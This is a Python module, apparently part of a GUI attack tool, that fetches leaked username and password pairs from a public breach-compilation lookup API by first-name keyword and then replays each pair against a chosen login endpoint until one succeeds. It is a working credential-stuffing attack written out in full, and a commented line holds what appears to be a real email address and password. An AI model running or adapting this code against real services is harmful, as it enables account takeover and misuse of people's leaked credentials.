import requests

from gui.dictionary_attacks.console_view import ConsoleView
from gui.dictionary_attacks.stopped_manager import is_stopped


class Credentials:
    def __init__(self, username, password):
        self.username = username
        self.password = password

    def __str__(self):
        return f"Username: {self.username}, Password: {self.password}"


global_credentials_list = [
    # Credentials("pppbbb616000@gmail.com", "jRez.LZ4J9E!3Du")
]
keywords = [
    "Liam", "Emma", "Noah", "Ava", "Oliver", "Isabella", "Elijah", "Sophia", "James",
    "Amelia", "Benjamin", "Mia", "William", "Charlotte", "Lucas", "Evelyn", "Henry", "Abigail", "Alexander",
    # "Harper", "Jack", "Ella", "Daniel", "Scarlett", "Matthew", "Aria", "Samuel", "Grace", "Jackson",
    # "Lily", "Sebastian", "Chloe", "Gabriel", "Ella", "Carter", "Nora", "Michael", "Zoey", "Wyatt",
    # "Isla", "John", "Layla", "Luke", "Mila", "Isaac", "Lucy", "Joshua", "Riley", "Andrew", "Sadie",
    # "Nathan", "Ruby", "Christopher", "Stella", "Joseph", "Victoria", "David", "Alice", "Aiden", "Maya",
    # "Anthony", "Penelope", "Eli", "Savannah", "Matthew", "Lily", "Dylan", "Audrey", "Caleb", "Zoey",
    # "Asher", "Bella", "Levi", "Luna", "Thomas", "Eleanor", "Hunter", "Scarlett", "Aaron", "Hazel",
    # "Julian", "Audrey", "Adam", "Mila", "Ryan", "Ellie", "Connor", "Nova", "Owen", "Lily", "Carson",
    # "Chloe", "Jaxon", "Emilia", "Mason", "Arlo", "Madeline", "Kai", "Brooklyn"
]


def set_credentials(query, console_view: ConsoleView, limit=10):
    credentials_list = []

    fetch_msg = f"[INFO] Fetching credentials for query '{query}'"
    console_view.add_text_schedule(fetch_msg)
    print(fetch_msg)

    url = f"https://api.proxynova.com/comb?query={query}&limit={limit}"

    response = requests.get(url)

    if response.status_code == 200:
        data = response.json()
        count = str(len(data["lines"]))
        found_msg = f"[INFO] Found {count} entries for query {query}"
        console_view.add_text_schedule(found_msg)
        print(found_msg)

        if len(data["lines"]) > 0:
            for line in data["lines"]:
                try:
                    parts = line.split(":")
                    credentials_list.append(Credentials(parts[0], parts[1]))
                except IndexError as e:
                    try:
                        parts = line.split(";")
                        credentials_list.append(Credentials(parts[0], parts[1]))
                    except IndexError as e:
                        pass

        else:
            not_found_msg = f"[ERROR] Could not find any credentials for query {query}"
            console_view.add_text_schedule(not_found_msg)
            print(not_found_msg)
    else:
        error_msg = f"[ERROR] Error: {response.status_code}"
        console_view.add_text_schedule(error_msg)

    return credentials_list


def dictionary_attack(username_var, password_var, login_success_var, url, headers,
                      credentials_list, console_view: ConsoleView):
    if len(credentials_list) > 0:
        for credentials in credentials_list:
            if is_stopped():
                break

            try:
                trying = "[INFO] Trying password: {} and {}: {}".format(credentials.password, username_var,
                                                                        credentials.username)
                console_view.add_text_schedule(trying)
                print(trying)

                payload = {
                    username_var: credentials.username,
                    password_var: credentials.password
                }

                response = requests.post(url, json=payload, headers=headers)

                if login_success_var in response.text or response.status_code == 200:
                    success_msg = f"[SUCCESS] Password found: {credentials.password}"
                    console_view.add_text_schedule(success_msg)
                    print(success_msg)
                    return True

                else:
                    failed_msg = f"[FAILED] Password incorrect"
                    console_view.add_text_schedule(failed_msg)
                    print(failed_msg)

            except Exception as e:
                error_msg = f"[ERROR] Error: {e}"
                console_view.add_text_schedule(error_msg)
                print(error_msg)

    return False

# if __name__ == "__main__":
# success = False
# for keyword in keywords:
#     set_credentials(keyword)
#     success = dictionary_attack(username_variable, password_variable, login_success_variable, url_global, headers_global)
#     if success: break
# print("Dictionary Attack Complete")
